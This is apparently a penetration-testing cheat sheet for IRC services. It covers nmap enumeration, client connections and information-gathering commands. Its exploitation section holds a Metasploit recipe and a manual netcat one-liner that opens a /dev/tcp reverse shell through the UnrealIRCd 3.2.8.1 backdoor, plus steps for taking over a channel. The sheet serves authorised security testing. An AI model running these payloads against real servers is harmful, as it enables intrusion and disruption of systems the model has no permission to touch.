# Port 194/6667 - IRC (Internet Relay Chat)

## Table of Contents

- [Enumeration](#enumeration)
- [Connection](#connection)
- [Exploitation](#exploitation)

---

## Enumeration

### Nmap Scripts

```shell
nmap -sV -sC -p194,6667,6660-7000 $rhost

# IRC specific scripts
nmap -p6667 --script irc-* $rhost
nmap -p6667 --script irc-info,irc-botnet-channels $rhost
```

### Banner Grabbing

```shell
nc -vn $rhost 6667
```

---

## Connection

### Using Netcat

```shell
nc $rhost 6667

# IRC commands
NICK testuser
USER testuser 0 * :Test User
JOIN #channel
PRIVMSG #channel :Hello
LIST
QUIT
```

### Using irssi

```shell
irssi -c $rhost -p 6667
```

### Using HexChat/XChat

```shell
hexchat --connect=$rhost:6667
```

---

## Exploitation

### Information Gathering

```shell
# List all channels
LIST

# Get server info
INFO

# Get server stats
STATS

# List users
WHO *
NAMES #channel

# Get user info
WHOIS username
```

### IRC Bouncer Detection

```shell
# Check for common IRC bouncers
nmap -p6667 --script irc-info $rhost | grep -i "bouncer\|znc\|psybnc"
```

### UnrealIRCd 3.2.8.1 Backdoor

> CVE-2010-2075 - Remote code execution

```shell
# Metasploit
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS $rhost
set RPORT 6667
exploit

# Manual exploitation
echo "AB; bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'" | nc $rhost 6667
```

### IRC Bot Detection

```shell
# Nmap botnet detection
nmap -p6667 --script irc-botnet-channels $rhost

# Common botnet channels
JOIN #botnet
JOIN #ddos
JOIN #scan
```

### Channel Takeover

```shell
# If ChanServ is not protecting channel
JOIN #target
MODE #target +o yournick
KICK #target victim
MODE #target +b *!*@victim.host
```

---

## Common IRC Servers

| Server | Default Port | Notes |
| --- | --- | --- |
| UnrealIRCd | 6667 | Check for backdoor |
| InspIRCd | 6667 | Modern, modular |
| ircd-hybrid | 6667 | Classic |
| ngircd | 6667 | Lightweight |
| Charybdis | 6667 | Used by Freenode |

---

## Useful Commands

```shell
# Server info
VERSION
ADMIN
MOTD
LUSERS

# Channel commands
JOIN #channel
PART #channel
TOPIC #channel
MODE #channel

# User commands
NICK newnick
OPER username password
KILL user :reason
```

---

## References

- [HackTricks - IRC](https://book.hacktricks.wiki/network-services-pentesting/pentesting-irc.html)
- [RFC 2812 - IRC Protocol](https://tools.ietf.org/html/rfc2812)
